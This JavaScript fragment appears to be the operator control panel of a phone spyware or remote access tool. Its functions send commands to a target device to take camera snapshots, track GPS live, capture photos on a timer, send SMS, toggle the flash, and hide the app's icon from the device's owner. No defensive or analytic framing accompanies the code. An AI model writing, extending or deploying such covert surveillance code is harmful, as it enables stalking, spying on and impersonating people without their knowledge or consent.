// ==================== CONTROL FUNCTIONS ====================
function capturePicture() {
    const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value;
    sendCommand('CAMERA_SNAPSHOT', { camera, flash: document.getElementById('clickFlashCheckbox').checked });
}

function displayCapturedImage(b64) {
    window.panel.innerHTML = `<img src="data:image/jpeg;base64,${b64}" style="max-width:100%;border-radius:8px;"><div style="margin-top:12px;"><button onclick="downloadBase64('${b64}','snapshot_${Date.now()}.jpeg')" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;">💾 SAVE IMAGE</button></div>`;
}

function toggleLiveGps() {
    window.liveGpsActive = !window.liveGpsActive;
    sendCommand(window.liveGpsActive ? 'START_GPS_UPDATES' : 'STOP_GPS_UPDATES');
    const btn = document.getElementById('liveGpsBtn');
    if (btn) {
        btn.style.background = window.liveGpsActive ? '#d32f2f' : '';
        btn.querySelector('span:last-child').textContent = window.liveGpsActive ? 'Stop GPS Track' : 'Live GPS Track';
    }
    if (window.liveGpsActive && window.currentLocation) {
        renderLiveMap(window.currentLocation.lat, window.currentLocation.lon, window.currentLocation.acc);
    } else if (!window.liveGpsActive) {
        window.panel.innerHTML = '<p>Live GPS tracking stopped.</p>';
        window.liveMap = null;
        window.liveMarker = null;
        window.liveCircle = null;
    }
}

function toggleAppIcon() { sendCommand(window.iconHidden ? 'SHOW_APP' : 'HIDE_APP'); }
function toggleFlash() { sendCommand(window.flashOn ? 'FLASH_OFF' : 'FLASH_ON'); }
function showSchedulePanel() {
    window.panel.innerHTML = '<h3>⏱️ Auto Screenshot</h3><div><label>Interval (minutes): <input id="schedInterval" type="number" value="5" min="1"></label><label style="margin-left:12px;">Camera: <select id="schedCam"><option value="0">Rear</option><option value="1">Front</option></select></label><button id="startSched" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;margin-top:12px;">Start</button><button id="stopSched" style="background:#d32f2f;color:white;border:none;padding:8px 16px;border-radius:6px;margin-top:12px;margin-left:8px;">Stop</button></div>';
    document.getElementById('startSched').onclick = () => { const mins = parseInt(document.getElementById('schedInterval').value) || 5; const cam = parseInt(document.getElementById('schedCam').value); sendCommand('SET_SCHEDULED_CAPTURE', { intervalMinutes: mins, cameraId: cam }); };
    document.getElementById('stopSched').onclick = () => sendCommand('STOP_SCHEDULED_CAPTURE');
}

function showSendSmsPanel() {
    window.panel.innerHTML = '<h3>✉️ Send SMS</h3><div><input id="smsNumber" placeholder="Phone Number" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;"><textarea id="smsBody" rows="4" placeholder="Message" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;"></textarea><button id="sendSmsBtn" style="background:#1976ff;color:white;border:none;padding:10px;border-radius:6px;width:100%;">Send SMS</button></div>';
    document.getElementById('sendSmsBtn').onclick = () => { const num = document.getElementById('smsNumber').value.trim(); const body = document.getElementById('smsBody').value.trim(); if (!num || !body) return showNotification('Enter number and message'); sendCommand('SEND_SMS', { number: num, body }); };
}
